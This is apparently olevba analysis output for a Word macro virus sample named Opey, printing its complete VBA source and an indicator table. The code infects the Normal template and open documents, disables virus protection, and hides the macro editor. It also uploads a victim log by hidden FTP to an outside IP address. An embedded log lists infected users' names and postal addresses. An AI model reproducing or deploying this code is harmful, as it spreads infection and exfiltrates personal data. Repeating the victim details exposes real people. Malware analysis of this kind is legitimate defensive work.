olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey-based-73e90dbaeb59b78161a88eec77af0e294756bd2e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey-based-73e90dbaeb59b78161a88eec77af0e294756bd2e - OLE stream: '_996752072/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 11:16:41 AM - Wednesday, 23 Dec 1998
' BCBSA
'



' 01:30:35 PM - Wednesday, 30 Dec 1998
' BCBSA
'



' 01:36:45 PM - Monday, 4 Jan 1999
' Sue Rosinski
'



' 03:03:59 PM - Tuesday, 5 Jan 1999
' BCBSA
'



' 01:52:36 PM - Monday, 18 Jan 1999
' David W. Nelson
' Belden Enterprises, Inc.
' 1835 W. Roscoe St.
' Chicago, IL  60657



' 11:27:09 AM - Wednesday, 20 Jan 1999
' Tim Henthorn
'



' 10:34:42 AM - Thursday, 28 Jan 1999
' Shirley Moran
'



' 11:51:36  - Tuesday, 2 Feb 1999
' Jan Tissera
'



' 11:09:36 AM - Wednesday, 10 Feb 1999
' SALES AND MARKETING
'



' 03:58:57 PM - Friday, 12 Feb 1999
' FOOD & BEVERAGE
'



' 05:40:20 PM - Friday, 12 Feb 1999
' FOOD & BEVERAGE
'



' 12:18:32 AM - Wednesday, 1 Jan 1997
' Ricardo Calixto Gomecua
' FR. BENILDA GOMECUA
'       142 FORTUNA ST
'       PASAY CITY M.M.
'       PHILIPPINES



' 07:59:16 PM - Thursday, 4 Mar 1999
' john
'



' 10:28:43 AM - Tuesday, 9 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 05:30:17 PM - Sunday, 7 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 03:37:35 PM - Thursday, 11 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 11:09:20 PM - Tuesday, 16 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 03:26:36 PM - Thursday, 18 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 03:03:30 PM - Friday, 19 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 12:37:33 AM - Monday, 22 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 12:47:53 AM - Monday, 22 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 01:42:03 PM - Monday, 22 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 01:34:44 AM - Saturday, 24 Mar 2096
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 11:34:10 AM - Friday, 28 May 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 10:50:58 PM - Wednesday, 9 Jun 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)


-------------------------------------------------------------------------------
VBA MACRO A_OPEY_03.bas 
in file: Virus.MSWord.Opey-based-73e90dbaeb59b78161a88eec77af0e294756bd2e - OLE stream: '_996752072/VBA/A_OPEY_03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub greetings()
    On Error Resume Next
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
        line1$ = ""
            If ((Month(Date) = 12) And (Day(Date) = 25)) Or ((Month(Date) = 1) And (Day(Date) = 1)) Then
                line1$ = "echo MERRY CHRISTMASS AND A HAPPY NEW YEAR !!!"
            End If
            If (Month(Date) = 11) And (Day(Date) = 1) Then
                line1$ = "echo HAPPY HALLOWEEN !!!"
            End If
            If (Month(Date) = 2) And (Day(Date) = 14) Then
                line1$ = "echo HAPPY VALENTINES DAY !!!"
            End If
            If (Month(Date) = 4) And (Day(Date) = 1) Then
                line1$ = "echo HAPPY LABOR DAY !!!"
            End If
            If (Month(Date) = 11) And (Day(Date) = 30) Then
                line1$ = "echo BONIFACIO DAY !!!"
            End If
            If (Month(Date) = 12) And (Day(Date) = 30) Then
                line1$ = "echo RIZAL DAY !!!"
            End If
            If (Month(Date) = 6) And (Day(Date) = 12) Then
                line1$ = "echo HAPPY INDEPENDENCE DAY !!!"
            End If
            If (Month(Date) = 4) And (Day(Date) >= 1) And (WeekDay(Date) >= 5) Then
                line1$ = "echo HOLY WEEK !!!"
            End If
               If line1$ <> "" Then
                    Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, line1$
                        Print #hFile, "echo from: OPEY A."
                        Print #hFile, "pause"
                    Close hFile
                End If
End Sub
Sub OnlyYou()
  On Error Resume Next
    Call A_OPEY_03
    NTInfected = False
        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(i).Name
                If clan = "A_OPEY_03" Then NTInfected = True
                If (clan <> "A_OPEY_03") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next i
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(j).Name
                    If clan = "A_OPEY_03" Then ODInfected = True
                    If (clan <> "A_OPEY_03") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next j
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="A_OPEY_03", Object:=wdOrganizerObjectProjectItems
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="A_OPEY_03", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
    Call greetings
End Sub
Sub A_OPEY_03()
    On Error Resume Next
    Application.UserName = "OPEY A."
    Application.UserAddress = "CNNHS B'92 PHILIPPINES (CNSC)"
    Application.UserInitials = "LOVE"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "OPEY A."
        .Title = "LOVE"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CommandBars("Tools").Controls("Customize...").Delete
    CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub FileSave()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Words(1) <> "" And ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Words(1) <> "" And ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    Call OnlyYou
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub AutoExec()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub AutoClose()
    On Error Resume Next
    Call OnlyYou
End Sub
Sub AutoExit()
    On Error Resume Next
    Call OnlyYou
    Application.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey-based-73e90dbaeb59b78161a88eec77af0e294756bd2e - OLE stream: '_996752098/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO A_OPEY_03.bas 
in file: Virus.MSWord.Opey-based-73e90dbaeb59b78161a88eec77af0e294756bd2e - OLE stream: '_996752098/VBA/A_OPEY_03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub greetings()
    On Error Resume Next
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
        line1$ = ""
            If ((Month(Date) = 12) And (Day(Date) = 25)) Or ((Month(Date) = 1) And (Day(Date) = 1)) Then
                line1$ = "echo MERRY CHRISTMASS AND A HAPPY NEW YEAR !!!"
            End If
            If (Month(Date) = 11) And (Day(Date) = 1) Then
                line1$ = "echo HAPPY HALLOWEEN !!!"
            End If
            If (Month(Date) = 2) And (Day(Date) = 14) Then
                line1$ = "echo HAPPY VALENTINES DAY !!!"
            End If
            If (Month(Date) = 4) And (Day(Date) = 1) Then
                line1$ = "echo HAPPY LABOR DAY !!!"
            End If
            If (Month(Date) = 11) And (Day(Date) = 30) Then
                line1$ = "echo BONIFACIO DAY !!!"
            End If
            If (Month(Date) = 12) And (Day(Date) = 30) Then
                line1$ = "echo RIZAL DAY !!!"
            End If
            If (Month(Date) = 6) And (Day(Date) = 12) Then
                line1$ = "echo HAPPY INDEPENDENCE DAY !!!"
            End If
            If (Month(Date) = 4) And (Day(Date) >= 1) And (WeekDay(Date) >= 5) Then
                line1$ = "echo HOLY WEEK !!!"
            End If
               If line1$ <> "" Then
                    Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, line1$
                        Print #hFile, "echo from: OPEY A."
                        Print #hFile, "pause"
                    Close hFile
                End If
End Sub
Sub OnlyYou()
  On Error Resume Next
    Call A_OPEY_03
    NTInfected = False
        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(i).Name
                If clan = "A_OPEY_03" Then NTInfected = True
                If (clan <> "A_OPEY_03") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next i
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(j).Name
                    If clan = "A_OPEY_03" Then ODInfected = True
                    If (clan <> "A_OPEY_03") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next j
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="A_OPEY_03", Object:=wdOrganizerObjectProjectItems
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="A_OPEY_03", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
    Call greetings
End Sub
Sub A_OPEY_03()
    On Error Resume Next
    Application.UserName = "OPEY A."
    Application.UserAddress = "CNNHS B'92 PHILIPPINES (CNSC)"
    Application.UserInitials = "LOVE"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "OPEY A."
        .Title = "LOVE"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CommandBars("Tools").Controls("Customize...").Delete
    CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub FileSave()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Words(1) <> "" And ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Words(1) <> "" And ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    Call OnlyYou
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub AutoExec()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub AutoClose()
    On Error Resume Next
    Call OnlyYou
End Sub
Sub AutoExit()
    On Error Resume Next
    Call OnlyYou
    Application.Quit
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

